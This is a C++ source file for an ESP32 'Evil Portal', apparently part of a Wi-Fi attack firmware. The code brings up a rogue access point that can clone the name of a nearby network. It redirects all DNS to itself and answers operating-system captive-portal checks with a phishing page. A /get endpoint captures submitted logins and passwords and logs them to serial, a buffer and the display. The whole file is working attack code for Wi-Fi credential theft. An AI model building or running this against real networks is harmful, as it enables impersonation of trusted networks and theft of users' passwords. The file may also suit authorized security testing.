#include "EvilPortal.h"
#include <esp_wifi.h>   // For esp_wifi_ap_get_sta_list

// Legacy global pointer expected by CaptiveRequestHandler
#ifdef HAS_PSRAM
  char* index_html = nullptr;
#endif

// HTTP server on port 80
AsyncWebServer server(80);

// ----------------------
// Constructor & Setup
// ----------------------

EvilPortal::EvilPortal() {}

void EvilPortal::setup() {
  this->runServer         = false;
  this->password_received = false;
  this->has_html          = false;
  this->has_ap            = false;
  this->using_serial_html = false;
  this->ap_index          = -1;
  this->client_connected  = false;
  this->lastStationPollMs = 0;

  html_files = new LinkedList<String>();

#ifdef HAS_SD
  if (sd_obj.supported) {
    sd_obj.listDirToLinkedList(html_files, "/", "html");
    Serial.println("Evil Portal Found " + (String)html_files->size() + " HTML files");
  }
#endif
}

// ----------------------
// Getters
// ----------------------

String EvilPortal::get_login() {
  return this->login;
}

String EvilPortal::get_password() {
  return this->password;
}

// ----------------------
// Template rendering
// ----------------------
//
// Takes the raw HTML template stored in html_template
// and replaces templated values.
//
String EvilPortal::renderPage() {
  String page = html_template;  // copy template

  // Replace {{AP_NAME}} with the configured AP name
  page.replace("{{AP_NAME}}", String(apName));

  // Add more replacements here if needed
  // page.replace("{{FOO}}", "BAR");

  return page;
}

// ----------------------
// Cleanup
// ----------------------

void EvilPortal::cleanup() {
  this->ap_index          = -1;
  this->has_html          = false;
  this->using_serial_html = false;
  html_template           = "";
#ifdef HAS_PSRAM
  index_html              = nullptr;   // legacy alias cleared
#else
  memset(index_html, 0, MAX_HTML_SIZE);
#endif
}

// ----------------------
// Begin Evil Portal
// ----------------------

bool EvilPortal::begin(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_points) {
  // Configure AP name (ESSID)
  if (!this->has_ap) {
    if (!this->setAP(ssids, access_points)) {
      return false;
    }
  }

  // Load HTML page
  if (!this->setHtml()) {
    return false;
  }

  // Start AP + DNS + HTTP server
  startPortal();
  return true;
}

// ----------------------
// Load HTML from Serial
// ----------------------

void EvilPortal::setHtmlFromSerial() {
  Serial.println("Setting HTML from serial...");

  // Read the entire HTML template from Serial
  html_template = Serial.readString();

  // Debug: print number of bytes received
  Serial.print("Bytes received: ");
  Serial.println(html_template.length());

  if (html_template.length() == 0) {
    Serial.println("No HTML read from serial");
    return;
  }
  
  // Legacy pointer for CaptiveRequestHandler
  index_html = const_cast<char*>(html_template.c_str());

  this->has_html          = true;
  this->using_serial_html = true;

  Serial.println("HTML set from serial successfully!");
}

// ----------------------
// Load HTML from SD card
// ----------------------

bool EvilPortal::setHtml() {
  if (this->using_serial_html) {
    Serial.println("HTML already set from serial");
    return true;
  }

  Serial.println("Setting HTML from SD...");

#ifdef HAS_SD
  File html_file = sd_obj.getFile("/" + this->target_html_name);
#else
  File html_file;
#endif

  if (!html_file) {
    Serial.println("Could not find /" + this->target_html_name);
#ifdef HAS_SCREEN
    this->sendToDisplay("Could not find /" + this->target_html_name);
    this->sendToDisplay("Touch to exit...");
#endif
    return false;
  }

  if (html_file.size() > MAX_HTML_SIZE) {
    Serial.println("HTML too large. Limit: " + (String)MAX_HTML_SIZE);
#ifdef HAS_SCREEN
    this->sendToDisplay("The given HTML is too large.");
    this->sendToDisplay("Byte limit: " + (String)MAX_HTML_SIZE);
    this->sendToDisplay("Touch to exit...");
#endif
    html_file.close();
    return false;
  }

  String html;
  html.reserve(html_file.size());

  while (html_file.available()) {
    char c = html_file.read();
    html += c;  // keep all characters including newlines
  }

  html_file.close();

  if (html.length() == 0) {
    Serial.println("HTML file was empty");
    return false;
  }

  html_template = html;   // store as template

  // Legacy pointer alias for CaptiveRequestHandler
  // IMPORTANT: This must point to stable memory
#ifndef HAS_PSRAM
  // Copy to the static buffer
  strncpy(index_html, html_template.c_str(), MAX_HTML_SIZE - 1);
  index_html[MAX_HTML_SIZE - 1] = '\0';  // Ensure null termination
#else
  // For PSRAM, the external index_html pointer should be managed separately
  index_html = const_cast<char*>(html_template.c_str());
#endif

  this->has_html = true;
  Serial.println("HTML loaded successfully");
  return true;
}

// ----------------------
// Configure AP (ESSID)
// ----------------------

bool EvilPortal::setAP(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_points) {
  int    selected_ap_index     = -1;
  String chosen_ap_name        = "";
  String selected_ap_from_list = "";

  // 1) Check AP list for a selected AP
  for (int i = 0; i < access_points->size(); i++) {
    if (access_points->get(i).selected) {
      selected_ap_from_list = access_points->get(i).essid;
      selected_ap_index     = i;
      break;
    }
  }

  // 2) If no AP from list and no SSIDs, use /ap.config.txt
  if ((ssids->size() <= 0) && (selected_ap_from_list == "")) {
#ifdef HAS_SD
    File ap_config_file = sd_obj.getFile("/ap.config.txt");
#else
    File ap_config_file;
#endif

    if (!ap_config_file) {
      Serial.println("Missing /ap.config.txt");
#ifdef HAS_SCREEN
      this->sendToDisplay("Could not find /ap.config.txt");
      this->sendToDisplay("Touch to exit...");
#endif
      return false;
    }

    if (ap_config_file.size() > MAX_AP_NAME_SIZE) {
      Serial.println("AP name too large (config file)");
#ifdef HAS_SCREEN
      this->sendToDisplay("AP name too large");
      this->sendToDisplay("Byte limit: " + (String)MAX_AP_NAME_SIZE);
      this->sendToDisplay("Touch to exit...");
#endif
      ap_config_file.close();
      return false;
    }

    while (ap_config_file.available()) {
      char c = ap_config_file.read();
      if (isPrintable(c)) {
        chosen_ap_name.concat(c);
      }
    }

    ap_config_file.close();
    Serial.println("AP name from config file: " + chosen_ap_name);
#ifdef HAS_SCREEN
    this->sendToDisplay("AP from config file");
    this->sendToDisplay("AP: " + chosen_ap_name);
#endif
  }
  // 3) Use first SSID from scan list
  else if (ssids->size() > 0) {
    chosen_ap_name = ssids->get(0).essid;

    if (chosen_ap_name.length() > MAX_AP_NAME_SIZE) {
      Serial.println("AP name too large (SSID list)");
#ifdef HAS_SCREEN
      this->sendToDisplay("AP name too large");
      this->sendToDisplay("Byte limit: " + (String)MAX_AP_NAME_SIZE);
      this->sendToDisplay("Touch to exit...");
#endif
      return false;
    }

    Serial.println("AP name from SSID list: " + chosen_ap_name);
#ifdef HAS_SCREEN
    this->sendToDisplay("AP from SSID list");
    this->sendToDisplay("AP: " + chosen_ap_name);
#endif
  }
  // 4) Use selected AP from AP list
  else if (selected_ap_from_list != "") {
    if (selected_ap_from_list.length() > MAX_AP_NAME_SIZE) {
      Serial.println("AP name too large (AP list)");
#ifdef HAS_SCREEN
      this->sendToDisplay("AP name too large");
      this->sendToDisplay("Byte limit: " + (String)MAX_AP_NAME_SIZE);
      this->sendToDisplay("Touch to exit...");
#endif
      return false;
    }

    chosen_ap_name = selected_ap_from_list;
    Serial.println("AP name from AP list: " + chosen_ap_name);
#ifdef HAS_SCREEN
    this->sendToDisplay("AP from AP list");
    this->sendToDisplay("AP: " + chosen_ap_name);
#endif
  }
  else {
    Serial.println("Could not configure Access Point.");
#ifdef HAS_SCREEN
    this->sendToDisplay("Could not configure AP");
    this->sendToDisplay("Touch to exit...");
#endif
    return false;
  }

  if (chosen_ap_name != "") {
    strncpy(apName, chosen_ap_name.c_str(), MAX_AP_NAME_SIZE);
    this->has_ap   = true;
    this->ap_index = selected_ap_index;
    Serial.println("AP config set: " + chosen_ap_name);
    return true;
  }

  return false;
}

bool EvilPortal::setAP(String essid) {
  if (essid == "" || essid.length() > MAX_AP_NAME_SIZE) {
    return false;
  }

  strncpy(apName, essid.c_str(), MAX_AP_NAME_SIZE);
  this->has_ap = true;
  Serial.println("AP config set: " + essid);
  return true;
}

// ----------------------
// HTTP Server Setup
// ----------------------

void EvilPortal::setupServer() {
  // Main page
  server.on("/", HTTP_GET, [this](AsyncWebServerRequest *request) {
    request->send(200, "text/html", renderPage());
  });

  // Captive portal endpoints used by different OSes
  const char* captiveEndpoints[] = {
    "/hotspot-detect.html",
    "/library/test/success.html",
    "/success.txt",
    "/generate_204",
    "/gen_204",
    "/ncsi.txt",
    "/connecttest.txt",
    "/redirect"
  };

  auto sendPortal = [this](AsyncWebServerRequest *request) {
    request->send(200, "text/html", renderPage());
  };

  for (int i = 0; i < (int)(sizeof(captiveEndpoints) / sizeof(captiveEndpoints[0])); i++) {
    server.on(captiveEndpoints[i], HTTP_GET, sendPortal);
  }

  // Expose AP name as plain text
  server.on("/get-ap-name", HTTP_GET, [this](AsyncWebServerRequest *request) {
    request->send(200, "text/plain", WiFi.softAPSSID());
  });

  // Capture password and redirect back to "/"
  server.on("/get", HTTP_GET, [this](AsyncWebServerRequest *request) {
    if (request->hasParam("login")) {
      this->login = request->getParam("login")->value();
      this->login_received = true;
    }
    
    if (request->hasParam("password")) {
      this->password = request->getParam("password")->value();
      this->password_received = true;
    }

    request->send(
      200,
      "text/html",
      "<html><head><script>setTimeout(()=>{window.location.href='/'},100);</script></head><body></body></html>"
    );
  });
}

// ----------------------
// Start Access Point
// ----------------------

void EvilPortal::startAP() {
  const IPAddress AP_IP(172, 0, 0, 1);

  Serial.print("Starting AP: ");
  Serial.println(apName);

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(AP_IP, AP_IP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(apName);

#ifdef HAS_SCREEN
  this->sendToDisplay("AP started");
#endif

  Serial.print("AP IP address: ");
  Serial.println(WiFi.softAPIP());

  this->setupServer();

  this->dnsServer.start(53, "*", WiFi.softAPIP());
  server.addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER);
  server.begin();

#ifdef HAS_SCREEN
  this->sendToDisplay("Evil Portal READY");
#endif

  Serial.println("Server + DNS started");
}

// ----------------------
// Poll Wi-Fi station list
// ----------------------

void EvilPortal::pollStationConnections() {
  const unsigned long POLL_INTERVAL_MS = 2000;
  unsigned long now = millis();

  if (now - this->lastStationPollMs < POLL_INTERVAL_MS) {
    return;
  }
  this->lastStationPollMs = now;

  wifi_sta_list_t stationList;
  memset(&stationList, 0, sizeof(stationList));

  esp_err_t err = esp_wifi_ap_get_sta_list(&stationList);
  if (err != ESP_OK) {
    return;
  }

  bool anyConnected = (stationList.num > 0);

  // Transition: no client -> at least one client
  if (anyConnected && !this->client_connected) {
    this->client_connected = true;
    Serial.println("Client connected (Wi-Fi)");
#ifdef HAS_SCREEN
    this->sendToDisplay("Client connected");
#endif
  }

  // Transition: had client -> now zero clients
  if (!anyConnected && this->client_connected) {
    this->client_connected = false;
    Serial.println("Client disconnected");
#ifdef HAS_SCREEN
    this->sendToDisplay("Client disconnected");
#endif
  }
}

// ----------------------
// Portal lifecycle
// ----------------------

void EvilPortal::startPortal() {
  this->startAP();
  this->runServer = true;
}

void EvilPortal::sendToDisplay(String msg) {
#ifdef HAS_SCREEN
  String display_string = msg;
  int temp_len = display_string.length();

  // Pad to 40 chars (expected by display buffer)
  for (int i = 0; i < 40 - temp_len; i++) {
    display_string.concat(" ");
  }

  display_obj.loading = true;
  display_obj.display_buffer->add(display_string);
  display_obj.loading = false;
#endif
}

// Called repeatedly from main loop
void EvilPortal::main(uint8_t scan_mode) {
  if ((scan_mode == WIFI_SCAN_EVIL_PORTAL) && this->has_ap && this->has_html) {
    this->dnsServer.processNextRequest();
    this->pollStationConnections();

    // If ANY credential was received
    if (this->password_received || this->login_received) {

      String result = "";

      // Build output depending on what was received
      if (this->login_received) {
        result += "login: " + this->login;
      }

      if (this->password_received) {
        if (result.length() > 0) result += " - ";  // add separator if login exists
        result += "password: " + this->password;
      }

      // Reset flags
      this->login_received = false;
      this->password_received = false;

      // Print to Serial + buffer + screen
      Serial.println(result);
      buffer_obj.append(result + "\n");

#ifdef HAS_SCREEN
      this->sendToDisplay(result);
#endif
    }
  }
}